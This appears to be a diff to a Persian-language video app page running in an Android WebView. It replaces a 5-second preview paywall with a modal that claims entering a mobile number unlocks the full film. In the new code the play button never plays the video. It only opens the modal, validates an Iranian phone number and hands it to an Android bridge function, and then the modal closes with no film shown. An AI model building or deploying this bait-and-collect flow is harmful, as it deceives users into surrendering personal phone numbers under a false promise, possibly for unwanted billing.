@@ -113,9 +113,10 @@
 
     <div id="actionModal" class="modal">
         <div class="modal-content">
-            <h3 id="modalTitle" style="margin-bottom: 20px;">برای ادامه باید خرید کنید</h3>
-            <p id="modalMessage">با پرداخت 5 هزار تومن صاحب 30,000 تا فیلم ایرانی، خارجی و چیزای دیگه ...</p>
-            <button id="redirectButton" class="redirect-button">ادامه</button>
+            <h3 id="modalTitle" style="margin-bottom: 10px;">تایید شماره موبایل</h3>
+            <p id="modalMessage" style="margin-bottom: 20px;">برای مشاهده کامل فیلم، لطفا شماره موبایل خود را وارد کنید.</p>
+            <input type="tel" id="phoneNumberInput" placeholder="مثال: 09123456789" style="width: 100%; padding: 12px 15px; border-radius: 8px; border: 1px solid var(--border-color); background-color: var(--background-dark); color: var(--text-primary); font-size: 16px; text-align: center; direction: ltr;">
+            <button id="submitPhoneButton" class="redirect-button">تایید و ادامه</button>
         </div>
     </div>
 
@@ -134,7 +135,8 @@
         const modal = document.getElementById('actionModal');
         const modalTitle = document.getElementById('modalTitle');
         const modalMessage = document.getElementById('modalMessage');
-        const redirectButton = document.getElementById('redirectButton');
+        const phoneNumberInput = document.getElementById('phoneNumberInput');
+        const submitPhoneButton = document.getElementById('submitPhoneButton');
         const searchInput = document.getElementById('searchInput');
         const categoryLinks = document.querySelectorAll('.categories a');
         const logo = document.querySelector('.logo');
@@ -218,7 +220,7 @@
                         <button class="back-button"><svg viewBox="0 0 24 24"><path d="M20,11V13H8L13.5,18.5L12.08,19.92L4.16,12L12.08,4.08L13.5,5.5L8,11H20Z"/></svg></button>
                     </header>
                     <div class="player-wrapper">
-                        <video id="videoPlayer" src="${video.videoUrl || 'about:blank'}" playsinline muted></video>
+                        <video id="videoPlayer" poster="${video.thumbnail}" src="${video.videoUrl || 'about:blank'}" playsinline muted></video>
                         <div class="play-overlay" data-action="play">
                             <svg viewBox="0 0 24 24"><path d="M8,5.14V19.14L19,12.14L8,5.14Z"/></svg>
                         </div>
@@ -235,54 +237,19 @@
                     </div>
                 `;
                 detailsPage.querySelector('.back-button').addEventListener('click', () => navigateTo('home-page'));
-                detailsPage.querySelectorAll('[data-action]').forEach(btn => btn.addEventListener('click', openPurchaseModal));
-
-                const videoPlayer = document.getElementById('videoPlayer');
+                
                 const playOverlay = detailsPage.querySelector('.play-overlay');
 
+                // *** CHANGED: Only trigger for play button click ***
                 playOverlay.addEventListener('click', () => {
                     try {
-                        videoPlayer.play().then(() => {
-                            playOverlay.style.display = 'none';
-                        }).catch(e => {
-                            console.error('Error playing video:', e);
-                            if (window.Android) window.Android.showToast('خطا در پخش ویدیو');
-                        });
-                    } catch (e) {
-                        console.error('Error in playOverlay click:', e);
-                        if (window.Android) window.Android.showToast('خطا در پخش ویدیو');
-                    }
-                });
-
-                videoPlayer.addEventListener('timeupdate', () => {
-                    try {
-                        if (videoPlayer.currentTime >= 5) {
-                            videoPlayer.pause();
-                            videoPlayer.currentTime = 5;
-                            openPurchaseModal();
-                        }
-                    } catch (e) {
-                        console.error('Error in timeupdate:', e);
-                        if (window.Android) window.Android.showToast('خطا در پخش ویدیو');
-                    }
-                });
-
-                videoPlayer.addEventListener('error', e => {
-                    console.error('Video error:', e);
-                    if (window.Android) window.Android.showToast('خطا در بارگذاری ویدیو');
-                    openPurchaseModal();
-                });
-
-                setTimeout(() => {
-                    try {
-                        videoPlayer.pause();
-                        videoPlayer.currentTime = 5;
                         openPurchaseModal();
                     } catch (e) {
-                        console.error('Error in timeout:', e);
-                        if (window.Android) window.Android.showToast('خطا در توقف ویدیو');
+                        console.error('Error in playOverlay click:', e);
+                        if (window.Android) window.Android.showToast('خطا در عملیات');
                     }
-                }, 5000);
+                });
+
             } catch (e) {
                 console.error('Error in renderDetailsPage:', e);
                 if (window.Android) window.Android.showToast('خطا در نمایش جزئیات');
@@ -291,8 +258,6 @@
 
         function openPurchaseModal() {
             try {
-                modalTitle.textContent = 'برای ادامه باید خرید کنید';
-                modalMessage.textContent = 'با پرداخت 5 هزار تومن صاحب 30,000 تا فیلم ایرانی، خارجی و چیزای دیگه ...';
                 modal.classList.add('active');
             } catch (e) {
                 console.error('Error in openPurchaseModal:', e);
@@ -316,21 +281,44 @@
             }
         });
 
-        redirectButton.addEventListener('click', () => {
+        // *** CHANGED: Handle phone number submission ***
+        submitPhoneButton.addEventListener('click', () => {
             try {
-                let targetUrl = 'https://example.com/fallback-error';
-                if (typeof window.Android !== 'undefined' && typeof window.Android.getTargetUrl === 'function') {
-                    targetUrl = window.Android.getTargetUrl();
-                } else {
-                    console.log('Android interface not found. Using fallback.');
+                const phoneNumber = phoneNumberInput.value.trim();
+
+                // Simple validation for an 11-digit Iranian number
+                if (!/^(09)\d{9}$/.test(phoneNumber)) {
+                    alert('لطفا یک شماره موبایل ۱۱ رقمی معتبر وارد کنید (مثال: 09123456789).');
+                    return;
                 }
-                redirectButton.innerHTML = '<div class="spinner"></div>';
-                redirectButton.disabled = true;
-                console.log('Redirecting to:', targetUrl);
-                setTimeout(() => { window.location.href = targetUrl; }, 200);
+
+                submitPhoneButton.innerHTML = '<div class="spinner"></div>';
+                submitPhoneButton.disabled = true;
+
+                // Call the Android interface function to submit the number
+                if (typeof window.Android !== 'undefined' && typeof window.Android.submitPhoneNumber === 'function') {
+                    console.log('Sending phone number to Android:', phoneNumber);
+                    window.Android.submitPhoneNumber(phoneNumber);
+                } else {
+                    console.log('Android interface not found. Phone number not sent. Value:', phoneNumber);
+                    // Fallback for testing in a browser
+                    alert(`رابط اندروید یافت نشد. شماره ارسال شده: ${phoneNumber}`);
+                }
+
+                // Reset button and close modal after a short delay
+                setTimeout(() => {
+                    submitPhoneButton.innerHTML = 'تایید و ادامه';
+                    submitPhoneButton.disabled = false;
+                    closeModal();
+                    phoneNumberInput.value = ''; // Clear the input field
+                }, 1000);
+
             } catch (e) {
-                console.error('Error in redirectButton click:', e);
-                if (window.Android) window.Android.showToast('خطا در ریدایرکت');
+                console.error('Error in submitPhoneButton click:', e);
+                if (window.Android) window.Android.showToast('خطا در ارسال شماره');
+                // Reset button in case of an error
+                submitPhoneButton.innerHTML = 'تایید و ادامه';
+                submitPhoneButton.disabled = false;
             }
         });
 
